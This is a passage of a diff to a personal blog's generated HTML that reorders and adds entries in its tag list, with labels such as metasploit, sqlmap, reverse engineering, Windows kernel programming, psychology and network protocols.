+                <a href="javascript:void(0)" class="js-tag color4">git</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1177,31 +1189,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">git</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">vsfptd</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">metasploit渗透魔鬼训练营笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">metasploit</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">加壳</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1209,19 +1197,27 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">vsfptd</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">metasploit</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">加壳</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">sqlmap</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">HOOK技术</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">内核编程</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+                <a href="javascript:void(0)" class="js-tag color1">Window内核编程</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1229,15 +1225,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">思考</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">心理学</a>
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+                <a href="javascript:void(0)" class="js-tag color4">心理学</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1254,6 +1254,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">深入理解计算机系统</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">网络协议</a>
               </li>
              
               <li class="article-tag-list-item">
